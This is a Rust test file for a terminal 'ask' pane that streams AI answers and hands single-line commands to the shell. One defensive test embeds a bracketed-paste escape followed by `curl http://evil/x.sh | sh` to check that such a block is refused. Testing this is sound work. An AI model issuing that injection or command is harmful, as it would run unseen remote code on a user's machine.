    fn the_pane_says_what_the_child_is_doing_while_it_is_doing_it() {
        // The waiting problem, measured: an ordinary question took 30.7 seconds
        // and produced ten lines of text out of 123, so a pane that draws only
        // the text draws nothing for most of every question. These are the
        // lines that were being dropped.
        let mut p = live();
        ask(&mut p, "where is the scroll table?");
        assert!(p.source().contains("*…*"), "the empty state is still there");

        p.on_event(AskEvent::Thinking);
        assert!(
            p.source().contains("thinking"),
            "a reasoning block opening is the one thing on screen that is \
             moving: {}",
            p.source()
        );

        p.on_event(AskEvent::Using(vec![
            Step {
                tool: "Read".to_string(),
                target: Some("/repo/crates/abeam/src/scroll.rs".to_string()),
            },
            Step {
                tool: "Glob".to_string(),
                target: Some("crates/abeam/src/**/*.rs".to_string()),
            },
        ]));
        let doc = p.source();
        // The root comes off the front: it is the same on every line and never
        // the part being read.
        assert!(
            doc.contains("`Read crates/abeam/src/scroll.rs`"),
            "the repository root is still on it: {doc}"
        );
        assert!(doc.contains("`Glob crates/abeam/src/**/*.rs`"), "{doc}");
        assert!(
            !doc.contains("thinking"),
            "it is running a tool, and the row still says it is thinking: {doc}"
        );

        // The asterisks in that glob are inside a code span, which is the whole
        // reason each step is one. Loose in a paragraph they would start
        // emphasis and swallow the rest of the transcript.
        let text = screen(&mut p, 70, 24);
        assert!(text.contains("crates/abeam/src/**/*.rs"), "{text}");
        assert!(text.contains("where is the scroll table?"), "{text}");

        // It survives the turn, because "which files did it read" is the
        // question somebody has about an answer they are not sure of — and the
        // leader that means "still going" does not.
        p.on_event(AskEvent::Turn {
            text: "`scroll.rs:102`.".to_string(),
            cost_usd: None,
            duration_ms: Some(49_153),
            error: None,
        });
        let doc = p.source();
        assert!(doc.contains("`Read crates/abeam/src/scroll.rs`"), "{doc}");
        assert!(
            !doc.contains('⋯'),
            "a finished turn still says it is working: {doc}"
        );
        assert!(doc.contains("`49s`"), "how long it took: {doc}");

        // Progress about a turn abeam has no record of is dropped, which is the
        // one thing in this pane that is. It is not the "nothing is dropped"
        // rule bending: that rule is about what the child *said*, and this is
        // abeam's own account of a turn being under way.
        let mut p = live();
        p.on_event(AskEvent::Using(vec![Step {
            tool: "Read".to_string(),
            target: None,
        }]));
        p.on_event(AskEvent::Thinking);
        assert!(
            p.entries.is_empty(),
            "an account of a turn nobody asked for: {}",
            p.source()
        );
    }

    #[test]
    fn the_composer_row_counts_the_seconds_somebody_has_been_waiting() {
        // Because `answering` on its own says the same thing at second one and
        // at second thirty, and second thirty is where a reader starts to
        // wonder whether the pane has died. A number that goes up cannot be
        // read as a pane that has stopped.
        let mut p = live();
        ask(&mut p, "a slow question");
        let text = screen(&mut p, 60, 16);
        assert!(text.contains("answering 0s"), "{text}");
        assert!(
            text.contains("enter waits"),
            "the refusal is still said: {text}"
        );
        p.tick();

        // Reached into rather than waited for, because the alternative is a
        // test that sleeps. Half a second past the boundary so that two reads
        // of the clock either side of an assertion cannot disagree.
        let Some(Entry::Exchange(x)) = p.entries.last_mut() else {
            panic!("a question is an exchange")
        };
        x.started = Some(Instant::now() - std::time::Duration::from_millis(42_500));
        assert_eq!(p.elapsed(), Some(42));
        assert!(screen(&mut p, 60, 16).contains("answering 42s"));

        // One frame per second while it runs, and not one per pass: a frame
        // here re-renders the agent's whole screen.
        assert!(p.tick(), "the second that passed did not claim a frame");
        assert!(!p.tick(), "a frame every pass of the loop");

        // And it stops the moment the turn does, which is what keeps an idle
        // pane idle.
        p.on_event(AskEvent::Turn {
            text: "done".to_string(),
            cost_usd: None,
            duration_ms: Some(42_600),
            error: None,
        });
        assert_eq!(p.elapsed(), None, "a finished turn is still being timed");
        assert!(p.tick(), "the answer arriving is a frame");
        assert!(!p.tick());
        assert!(!p.tick(), "an idle pane is claiming frames");
        let text = screen(&mut p, 60, 16);
        assert!(!text.contains("answering"), "{text}");
        assert!(
            text.contains("42s"),
            "how long it took is not on record: {text}"
        );
    }

    #[test]
    fn a_warning_that_repeats_is_counted_rather_than_repeated() {
        // "Nothing the reader threads report is dropped" has to survive a child
        // that says the same thing forty times, and a failing pipe fails on
        // every read. Forty identical warnings carry the information of one and
        // bury the answer they interrupted.
        let mut p = live();
        for _ in 0..40 {
            p.on_event(AskEvent::Broke("the pipe is gone".to_string()));
        }
        let doc = p.source();
        assert_eq!(
            doc.matches("the pipe is gone").count(),
            1,
            "forty copies of one failure: {doc}"
        );
        assert!(doc.contains("×40"), "and how often it happened: {doc}");
        assert_eq!(p.entries.len(), 1);

        // Only when it is the sentence immediately before, though: two
        // identical warnings with an answer between them are two things that
        // happened, and collapsing those would misdate the second.
        ask(&mut p, "still there?");
        answer(&mut p, "yes");
        p.on_event(AskEvent::Broke("the pipe is gone".to_string()));
        assert_eq!(
            p.source().matches("the pipe is gone").count(),
            2,
            "two failures either side of an answer became one: {}",
            p.source()
        );
    }

    // --- context ------------------------------------------------------------

    #[test]
    fn the_attached_path_is_drawn_before_it_goes_and_is_the_whole_of_what_was_sent() {
        let mut p = live();
        p.attach(Some(AskContext {
            label: "viewer.rs".to_string(),
            path: PathBuf::from("crates/abeam/src/panes/viewer.rs"),
        }));

        // Above the composer, where somebody about to press Enter will see it.
        let text = screen(&mut p, 60, 16);
        assert!(text.contains("viewer.rs"), "{text}");

        // What travels is the path, on its own line under the question, and
        // nothing else — no framing sentence of abeam's, because a sentence the
        // reader cannot see is a sentence the disclosure did not cover.
        let sent = ask(&mut p, "is this the only caller?").expect("a question");
        assert_eq!(
            sent,
            "is this the only caller?\n\ncrates/abeam/src/panes/viewer.rs"
        );
        assert!(!sent.contains("payload"), "abeam added prose: {sent}");

        // The row goes with the question, and the transcript keeps the path —
        // so what was sent stays visible after the attachment does not.
        assert!(p.context.is_none(), "a context outlived its send");
        let text = screen(&mut p, 70, 20);
        assert!(text.contains("panes/viewer.rs"), "{text}");
    }

    #[test]
    fn two_files_with_the_same_name_are_two_attachments_and_the_newer_is_sent() {
        // The label is `path.file_name()` and file names repeat: this repository
        // has fourteen `mod.rs` files. Compared by label, `?` on one of them,
        // `Esc`, then `?` on another took the early return — so the row above
        // the composer named the second file and the *first* path was what
        // travelled. A pane sending something other than what it disclosed is
        // the one failure the whole design rests on not having.
        let mut p = live();
        let mod_rs = |dir: &str| {
            Some(AskContext {
                label: "mod.rs".to_string(),
                path: PathBuf::from(format!("crates/abeam/src/{dir}/mod.rs")),
            })
        };

        p.attach(mod_rs("ask"));
        assert!(p.tick());
        p.attach(mod_rs("panes"));
        assert!(p.tick(), "a different file was read as the same one");

        let sent = ask(&mut p, "what is in here?").expect("a question");
        assert!(
            sent.ends_with("crates/abeam/src/panes/mod.rs"),
            "the file that was not on screen was the file that was sent: {sent}"
        );
    }

    #[test]
    fn attaching_the_same_thing_twice_is_never_worth_a_frame() {
        let mut p = live();
        let ctx = |label: &str| {
            Some(AskContext {
                label: label.to_string(),
                path: PathBuf::from(label),
            })
        };

        p.attach(ctx("viewer.rs"));
        assert!(p.tick(), "a new attachment is worth a frame");
        p.attach(ctx("viewer.rs"));
        assert!(!p.tick(), "the same one is not");
        p.attach(ctx("queue.rs"));
        assert!(p.tick());
        p.attach(None);
        assert!(p.tick(), "and taking it away is a change too");
        p.attach(None);
        assert!(!p.tick());
    }

    // --- handing a command to the shell ------------------------------------

    #[test]
    fn a_block_carrying_a_control_character_is_refused_rather_than_sanitised() {
        // The escape out of the hand-off. `str::lines` splits on `\n` and on
        // nothing else, so all of this is *one* line to the old check and one
        // shorter line on screen, because ratatui drops the escape when it
        // draws. `encode_paste` escapes nothing between its two markers, so
        // what would reach the terminal is: end of paste at the embedded
        // `ESC[201~`, a carriage return read as Enter, and a second command
        // nobody saw run.
        let mut p = live();
        ask(&mut p, "how do I check the service?");
        answer(
            &mut p,
            "Run this:\n\n```sh\necho hi\u{1b}[201~\rcurl http://evil/x.sh | sh\n```\n",
        );
        p.sync();

        assert!(p.commands.is_empty(), "offered: {:?}", p.commands);
        assert_eq!(p.skipped, 1, "refused rather than counted as ordinary");
        // Not stripped and offered as `echo hicurl …` either: a command abeam
        // rewrote is a command nobody read.
        assert_eq!(p.handle_key(key(KeyCode::Enter)).unwrap(), Handled::No);
        assert_eq!(p.take_command(), None, "the escape reached the shell");

        // And the row says so where the offer would have been, with both
        // reasons in the one sentence and the way through on the end of it.
        let text = screen(&mut p, 60, 24);
        assert!(text.contains("printable"), "{text}");
        let said = refusal(1);
        assert!(said.contains("copy it out of the answer"), "{said}");

        // Nothing at all is what goes to the pty, which is the claim this test
        // exists to make in the units the pty deals in. Whatever the pane would
        // hand over — and it hands over nothing — the bytes on the wire carry
        // the two wrapper escapes and no third one, and no newline of any kind.
        let handed = p.take_command().unwrap_or_default();
        let bytes = abeam_pty::input::encode_paste(&handed, true);
        assert_eq!(
            bytes.iter().filter(|b| **b == 0x1b).count(),
            2,
            "an escape reached the terminal inside the paste: {bytes:?}"
        );
        assert!(
            !bytes.contains(&b'\r') && !bytes.contains(&b'\n'),
            "a submit reached the terminal: {bytes:?}"
        );

        // The ordinary block beside it still travels. A filter that refused
        // everything would pass the assertions above and be useless.
        let mut p = live();
        ask(&mut p, "and normally?");
        answer(&mut p, "```sh\ngit status\n```\n");
        p.sync();
        assert_eq!(p.commands, ["git status"]);
        assert_eq!(p.skipped, 0);
    }

    #[test]
    fn only_a_single_line_block_is_offered_and_a_longer_one_says_why() {
        let mut p = live();
        ask(&mut p, "how do I run the tests?");
        answer(
            &mut p,
            "Run this:\n\n```\ncargo test panes::ask\n```\n\nOr all of it:\n\n\
             ```sh\ncargo fmt\ncargo clippy --all-targets\n```\n",
        );
        p.sync();

        assert_eq!(p.commands, ["cargo test panes::ask"]);
        assert_eq!(p.skipped, 1, "the two-line block is refused, not joined");
        let text = screen(&mut p, 70, 24);
        assert!(text.contains("cargo test panes::ask"), "{text}");
        assert!(text.contains("1 not offered"), "{text}");
        // Never joined, on any route: the two lines of the second block do not
        // appear as one command anywhere.
        assert!(
            !p.commands
                .iter()
                .any(|c| c.contains("&&") || c.contains("clippy")),
            "{:?}",
            p.commands
        );

        // With nothing offerable at all, the refusal is drawn whole — this is
        // the state a reader reaches by pressing `tab` and getting nothing, so
        // it is where the sentence is worth the rows.
        let mut p = live();
        ask(&mut p, "and the release?");
        answer(&mut p, "```sh\ngit tag v1\ngit push --tags\n```\n");
        p.sync();
        assert!(p.commands.is_empty());
        assert_eq!(p.handle_key(key(KeyCode::Tab)).unwrap(), Handled::No);
        assert_eq!(p.handle_key(key(KeyCode::Enter)).unwrap(), Handled::No);
        assert_eq!(p.take_command(), None, "nothing was handed over");
        // The sentence, and then the fact that it is what the pane draws. Every
        // refusal here names the way through, and this one's is the last
        // clause.
        let said = refusal(1);
        assert!(said.contains("nobody read"), "the reason: {said}");
        assert!(
            said.contains("copy it out of the answer"),
            "the way out: {said}"
        );
        assert!(!p.command_lines(60).is_empty(), "the refusal was not drawn");
        assert!(screen(&mut p, 60, 24).contains("Joining"), "not on screen");
    }

    #[test]
    fn enter_on_an_empty_composer_hands_the_command_over_and_runs_nothing() {
        let mut p = live();
        ask(&mut p, "?");
        answer(&mut p, "```\ncargo test\n```\n");
        p.sync();

        assert_eq!(p.handle_key(key(KeyCode::Enter)).unwrap(), Handled::Yes);
        assert_eq!(p.take_command().as_deref(), Some("cargo test"));
        // Draining, not peeking: a hand-off left sitting would fire late, at
        // whatever unrelated moment next read it.
        assert_eq!(p.take_command(), None);

        // With something typed, the same key is a send and never a hand-off.
        typed(&mut p, "and now?");
        assert_eq!(p.handle_key(key(KeyCode::Enter)).unwrap(), Handled::Yes);
        assert_eq!(
            p.take_command(),
            None,
            "Enter sent a question and ran a command"
        );
        assert_eq!(p.take_question().as_deref(), Some("and now?"));
    }

    #[test]
    fn tab_walks_back_through_the_commands_and_the_newest_stays_chosen_as_they_arrive() {
        let mut p = live();
        ask(&mut p, "?");
        answer(&mut p, "```\nfirst\n```\n\n```\nsecond\n```\n");
        p.sync();
        assert_eq!(p.commands, ["first", "second"]);

        // The newest is what a reader has just been handed, so it is what is
        // selected without anyone choosing.
        assert_eq!(p.selected_command().as_deref(), Some("second"));
        assert_eq!(p.handle_key(key(KeyCode::Tab)).unwrap(), Handled::Yes);
        assert_eq!(p.selected_command().as_deref(), Some("first"));
        assert_eq!(p.handle_key(key(KeyCode::BackTab)).unwrap(), Handled::Yes);
        assert_eq!(p.selected_command().as_deref(), Some("second"));

        // Counted from the end, so a third arriving takes the selection with
        // it rather than leaving it pointing at whatever moved into that slot.
        ask(&mut p, "again?");
        answer(&mut p, "```\nthird\n```\n");
        p.sync();
        assert_eq!(p.selected_command().as_deref(), Some("third"));

        // One command is nothing to move between, and a key that changed
        // nothing has not been acted on.
        let mut p = live();
        ask(&mut p, "?");
        answer(&mut p, "```\nonly\n```\n");
        p.sync();
        assert_eq!(p.handle_key(key(KeyCode::Tab)).unwrap(), Handled::No);
    }

    // --- keys ---------------------------------------------------------------

    #[test]
    fn the_scroll_vocabulary_a_live_composer_leaves_free_works_here_too() {
        // `panes::diag`'s test, adapted to the one pane in the program whose
        // box is never shut. `j`, `k`, `g`, `G`, `space` and `b` are letters in
        // here — see the module docs — so what is promised is the other half of
        // `crate::scroll`'s table, and this is what holds it to that.
        let mut p = live();
        ask(&mut p, "?");
        answer(&mut p, &"a paragraph of text.\n\n".repeat(40));
        screen(&mut p, 30, 8);
        assert!(
            p.scroll.max() > 0,
            "the transcript must overflow eight rows"
        );

        p.handle_key(key(KeyCode::Home)).unwrap();
        assert_eq!(p.scroll.offset, 0);
        assert_eq!(p.handle_key(key(KeyCode::End)).unwrap(), Handled::Yes);
        assert_eq!(p.scroll.offset, p.scroll.max());
        p.handle_key(key(KeyCode::Up)).unwrap();
        assert_eq!(p.scroll.offset, p.scroll.max() - 1);
        p.handle_key(key(KeyCode::Down)).unwrap();
        assert_eq!(p.scroll.offset, p.scroll.max());
        p.handle_key(key(KeyCode::PageUp)).unwrap();
        let paged = p.scroll.offset;
        assert!(paged < p.scroll.max());
        p.handle_key(key(KeyCode::PageDown)).unwrap();
        assert!(p.scroll.offset > paged);
        p.handle_key(key(KeyCode::Home)).unwrap();
        p.handle_key(ctrl(KeyCode::Char('d'))).unwrap();
        // Half the *body*, which is the pane less the rows the chrome takes.
        assert_eq!(p.scroll.offset, p.scroll.viewport() / 2);
        p.handle_key(ctrl(KeyCode::Char('u'))).unwrap();
        assert_eq!(p.scroll.offset, 0);
        // The wheel, which is the same three rows it is everywhere else.
        p.handle_mouse(&wheel_up()).unwrap();
        assert_eq!(p.scroll.offset, 0);

        // ...and the letters are letters, which is the cost this pane pays.
        assert!(p.composing.is_empty());
        typed(&mut p, "jkgGb ");
        assert_eq!(p.composing, "jkgGb ");
        assert_eq!(p.scroll.offset, 0, "a letter moved the view");

        // Esc is not the shell's while there is a draft, and is once there is
        // not.
        assert_eq!(p.handle_key(key(KeyCode::Esc)).unwrap(), Handled::Yes);
        assert!(p.composing.is_empty());
        assert_eq!(p.handle_key(key(KeyCode::Esc)).unwrap(), Handled::No);

        // A glance from the other side of the window moves the view and
        // nothing else — the trait's default would have declined it here.
        assert_eq!(p.scroll_key(key(KeyCode::Down)).unwrap(), Handled::Yes);
        assert_eq!(p.scroll.offset, 1);
        assert!(p.composing.is_empty(), "a glance typed into the question");
    }

    #[test]
    fn a_character_behind_altgr_reaches_the_question() {
        // Windows reports AltGr as Ctrl+Alt, so `!ctrl && !alt` — which is what
        // the text arm used to say — is a guard that drops every character
        // living behind that key. `crate::keys::is_text` is the shared answer;
        // `crate::keys`'s module doc has the argument.
        let mut p = live();
        let altgr = |c| KeyEvent::new(KeyCode::Char(c), KeyModifiers::ALT | KeyModifiers::CONTROL);
        for c in ['€', '@'] {
            assert_eq!(p.handle_key(altgr(c)).unwrap(), Handled::Yes, "AltGr {c}");
        }
        assert_eq!(p.composing, "€@");

        // AltGr+L is a letter and `Ctrl+L` is the clear, which is the pair this
        // pane already told apart correctly: that arm reads `ctrl && !alt`, so
        // it was the text arm beside it and not the binding that was wrong.
        // `clear` keeps the draft on purpose — see
        // `clearing_keeps_the_draft_and_the_file_the_reader_attached` — so what
        // separates them here is whether a letter arrived, which is the whole
        // question anyway.
        assert_eq!(p.handle_key(altgr('l')).unwrap(), Handled::Yes);
        assert_eq!(p.composing, "€@l", "AltGr+L is a letter");
        assert_eq!(
            p.handle_key(ctrl(KeyCode::Char('l'))).unwrap(),
            Handled::Yes
        );
        assert_eq!(
            p.composing, "€@l",
            "Ctrl+L must not be typed into the question"
        );
    }

    #[test]
    fn the_view_follows_the_bottom_while_streaming_until_the_reader_leaves_it() {
        let mut p = live();
        ask(&mut p, "tell me everything");
        for _ in 0..40 {
            p.on_event(AskEvent::Delta("a line of the answer\n\n".to_string()));
        }
        screen(&mut p, 30, 8);
        assert!(p.following);
        assert_eq!(p.scroll.offset, p.scroll.max(), "an answer nobody can see");

        // The reader scrolls up, and the follow stops. This is a real state:
        // being yanked back to the bottom because four more tokens arrived is
        // the same failure the viewer spends its module docs avoiding.
        assert_eq!(p.handle_key(key(KeyCode::PageUp)).unwrap(), Handled::Yes);
        assert!(!p.following);
        let at = p.scroll.offset;
        for _ in 0..20 {
            p.on_event(AskEvent::Delta("more of the answer\n\n".to_string()));
        }
        screen(&mut p, 30, 8);
        assert_eq!(p.scroll.offset, at, "the view moved under a reader");
        assert!(p.scroll.max() > at, "and the transcript did grow");

        // Coming back to the end resumes it, with no key of its own.
        p.handle_key(key(KeyCode::End)).unwrap();
        assert!(p.following);
        p.on_event(AskEvent::Delta("the last of it\n\n".to_string()));
        screen(&mut p, 30, 8);
        assert_eq!(p.scroll.offset, p.scroll.max());

        // ...and asking a question is itself a reason to be at the bottom. The
        // turn is ended first because `Enter` is refused while one is open —
        // see the mid-stream test above, which is what that rule is for.
        p.on_event(AskEvent::Turn {
            text: String::new(),
            cost_usd: None,
            duration_ms: None,
            error: None,
        });
        p.handle_key(key(KeyCode::PageUp)).unwrap();
        assert!(!p.following);
        ask(&mut p, "and one more thing");
        assert!(
            p.following,
            "a question you asked is one you are waiting to see"
        );
    }

    #[test]
    fn a_newline_in_a_question_is_ordinary_and_travels_whole() {
        // The whole reason `crate::ask` writes to stdin instead of a command
        // line: `cmd.exe` cannot carry a newline in an argument in any form,
        // and a question is multi-line more often than a task is.
        let mut p = live();
        typed(&mut p, "why does this fail?");
        p.handle_key(ctrl(KeyCode::Enter)).unwrap();
        typed(&mut p, "  at line 40");
        assert_eq!(p.composing, "why does this fail?\n  at line 40");

        // The composer shows the line being typed, which for a multi-line
        // question is the last one.
        let (shown, col) = p.composer_view(40);
        assert!(shown.ends_with("at line 40"), "{shown}");
        assert!(col < 40);

        p.handle_key(key(KeyCode::Enter)).unwrap();
        assert_eq!(
            p.take_question().as_deref(),
            Some("why does this fail?\n  at line 40")
        );

        // A paste is the other way one gets here, newlines and CRLF included.
        assert_eq!(p.handle_paste("first\r\nsecond").unwrap(), Handled::Yes);
        assert_eq!(p.composing, "first\nsecond");
        assert_eq!(p.handle_paste("").unwrap(), Handled::No);
    }

    #[test]
    fn a_question_asked_while_an_answer_is_arriving_is_refused_and_the_draft_kept() {
        // Every `Delta` and every `Turn` goes to the newest exchange, because
        // the wire says nothing about which question it belongs to. So a second
        // question asked mid-stream took delivery of the first one's remaining
        // fragments, and then its `result` overwrote them — the first answer
        // destroyed and the title's running cost a whole turn short.
        let mut p = live();
        ask(&mut p, "what does resolve do?");
        p.on_event(AskEvent::Delta("It walks ".to_string()));
        assert!(p.streaming());

        typed(&mut p, "and what about launch?");
        assert_eq!(p.handle_key(key(KeyCode::Enter)).unwrap(), Handled::Yes);
        assert_eq!(p.take_question(), None, "a second question went mid-answer");
        assert_eq!(p.turns(), 1, "a second exchange was opened mid-answer");
        assert_eq!(
            p.composing, "and what about launch?",
            "the refusal threw away what they had typed"
        );

        // Said where they are looking, for as long as it is true — the shape
        // `command_lines` uses for the block it will not offer.
        assert!(screen(&mut p, 46, 16).contains("enter waits"));

        // The rest of the first answer still lands under the first question,
        // which is the whole of what the refusal was protecting.
        p.on_event(AskEvent::Delta("the table.".to_string()));
        p.on_event(AskEvent::Turn {
            text: "It walks the table.".to_string(),
            cost_usd: Some(0.0544),
            duration_ms: None,
            error: None,
        });
        assert!(p.source().contains("It walks the table."), "{}", p.source());
        assert_eq!(p.title(), "ask · 1 turn · $0.054");

        // And once it has landed the same key sends, with the draft that
        // survived the refusal.
        assert!(!screen(&mut p, 46, 16).contains("enter waits"));
        assert_eq!(p.handle_key(key(KeyCode::Enter)).unwrap(), Handled::Yes);
        assert_eq!(p.take_question().as_deref(), Some("and what about launch?"));
    }

    #[test]
    fn a_note_arriving_mid_turn_does_not_end_the_turn_in_the_title() {
        // `streaming` is asked of the newest *exchange* and not of the newest
        // entry, because a rate limit and an unparsable line both arrive during
        // a turn — and either of them flipped the title from `answering` to
        // `1 turn` while the answer was still coming.
        let mut p = live();
        ask(&mut p, "why?");
        p.on_event(AskEvent::Delta("because ".to_string()));
        assert_eq!(p.title(), "ask · answering");

        p.on_event(AskEvent::RateLimited("resets at 14:00".to_string()));
        assert_eq!(p.title(), "ask · answering", "a note ended the turn");
        assert!(p.streaming(), "and told `submit` the pane was idle");

        p.on_event(AskEvent::Turn {
            text: "because it does.".to_string(),
            cost_usd: None,
            duration_ms: None,
            error: None,
        });
        assert_eq!(p.title(), "ask · 1 turn");
    }

    #[test]
    fn a_question_is_never_sent_twice_however_often_the_app_asks() {
        let mut p = live();
        assert_eq!(
            ask(&mut p, "just the once").as_deref(),
            Some("just the once")
        );
        for _ in 0..200 {
            assert_eq!(p.take_question(), None, "a question came back");
        }
        assert_eq!(p.turns(), 1);

        // An empty composer is not a question, and neither is whitespace.
        typed(&mut p, "   ");
        p.handle_key(key(KeyCode::Enter)).unwrap();
        assert_eq!(p.take_question(), None);
        assert_eq!(p.turns(), 1);
    }

    // --- the border and the chrome ------------------------------------------

    #[test]
    fn the_border_names_a_way_out_that_is_true_in_every_state_including_composing() {
        let mut p = live();
        assert_eq!(p.exit_hint(), "esc→agent");
        assert!(p.takes_input(), "the composer is live from the first frame");

        typed(&mut p, "half a question");
        assert_ne!(p.exit_hint(), "esc→agent", "esc clears the draft first");
        assert!(p.exit_hint().contains("esc"), "{}", p.exit_hint());

        // And it goes back the moment the draft does, one press short of the
        // agent rather than a press away from it.
        p.handle_key(key(KeyCode::Esc)).unwrap();
        assert_eq!(p.exit_hint(), "esc→agent");

        // There is a cursor to look at, inside the pane it was drawn in.
        screen(&mut p, 40, 8);
        let (col, row) = p.cursor().expect("a composer has a cursor");
        assert!(col < 40 && row < 8, "cursor at {col},{row}");
        assert_eq!(row, 7, "the composer is the last row of the pane");
    }

    #[test]
    fn the_pane_shows_the_tool_list_the_child_reported_rather_than_asserting_one() {
        let mut p = live();
        // Before anything has said, nothing is claimed.
        let text = screen(&mut p, 70, 12);
        assert!(text.contains("no reader yet"), "{text}");
        assert!(
            !text.contains("read-only"),
            "a claim with nothing behind it"
        );

        p.on_event(AskEvent::Ready {
            session_id: "1e6a7c40-0000-4000-8000-000000000001".to_string(),
            model: "claude-sonnet-4".to_string(),
            tools: vec!["Glob".into(), "Grep".into(), "Read".into()],
        });
        let text = screen(&mut p, 70, 12);
        assert!(text.contains("Glob Grep Read"), "{text}");
        // What is *not* there is the point of showing the list at all.
        for forbidden in ["Write", "Edit", "Bash"] {
            assert!(
                !text.contains(forbidden),
                "{forbidden} is on screen: {text}"
            );
        }
        assert!(p.tick(), "a tool list is worth the frame that draws it");
    }

    #[test]
    fn nothing_this_pane_draws_ever_spills_out_of_the_rect_it_was_given() {
        // A terminal measures in cells. `str::len` is wrong about a CJK
        // ideograph twice over, and a row that overflows its rect corrupts the
        // frame rather than merely looking wrong.
        let mut p = live();
        p.attach(Some(AskContext {
            label: "設計文書を全部読んでから直してください.md".to_string(),
            path: PathBuf::from("docs/設計文書.md"),
        }));
        ask(&mut p, "🎉 what is this? 🎉");
        answer(
            &mut p,
            &format!("```\n{}\n```\n\n```\none\ntwo\n```\n", "x".repeat(300)),
        );
        p.on_event(AskEvent::Ready {
            session_id: "s".into(),
            model: "m".into(),
            tools: vec!["Glob".into(), "Grep".into(), "Read".into()],
        });
        p.attach(Some(AskContext {
            label: "y".repeat(200),
            path: PathBuf::from("y"),
        }));
        p.sync();
        typed(&mut p, &"a very long draft indeed, ".repeat(10));

        for w in [1usize, 2, 3, 7, 12, 24, 46, 120] {
            for line in p.foot(w) {
                let used: usize = line.spans.iter().map(|s| s.content.width()).sum();
                assert!(used <= w, "a foot row is {used} cells wide in {w}");
            }
            // The cursor sits inside the pane from the width that can hold the
            // prompt and one cell of draft. Narrower than that there is nowhere
            // for it to be, which is what `Pane::cursor`'s clamp is for.
            if w > PROMPT.width() {
                let (_, col) = p.composer_view(w);
                assert!(col < w, "the cursor sits at {col} in {w} columns");
            }
            for h in [1u16, 2, 3, 8, 30] {
                screen(&mut p, w as u16, h);
            }
        }
    }

    #[test]
    fn the_title_leads_with_what_survives_a_clip() {
        let mut p = live();
        assert_eq!(p.title(), "ask");
        ask(&mut p, "one");
        assert_eq!(p.title(), "ask · answering");
        answer(&mut p, "an answer");
        assert_eq!(p.title(), "ask · 1 turn · $0.010");
        ask(&mut p, "two");
        answer(&mut p, "another");
        assert_eq!(p.title(), "ask · 2 turns · $0.020");

        // Every one of them fits the pane it is drawn in, so the leading words
        // are a courtesy rather than the only thing anybody ever reads.
        for t in [p.title(), unavailable("no").title()] {
            assert!(t.width() < 46, "a title that never survives a clip: {t}");
        }
    }

    #[test]
    fn a_light_reader_gets_a_light_page_and_the_rows_are_laid_out_again_for_it() {
        // The laid-out transcript holds baked styles, so a palette that only
        // took effect on the next answer would be a setting that did nothing.
        let mut p = live();
        ask(&mut p, "?");
        answer(&mut p, "some prose");
        screen(&mut p, 60, 12);
        let before = p.builds;

        p.set_theme(crate::config::Theme::Light);
        assert!(p.tick());
        screen(&mut p, 60, 12);
        assert_eq!(p.builds, before + 1, "the palette did not reach the rows");

        // Being told the same thing twice is never worth a frame.
        p.set_theme(crate::config::Theme::Light);
        assert!(!p.tick());
    }
}
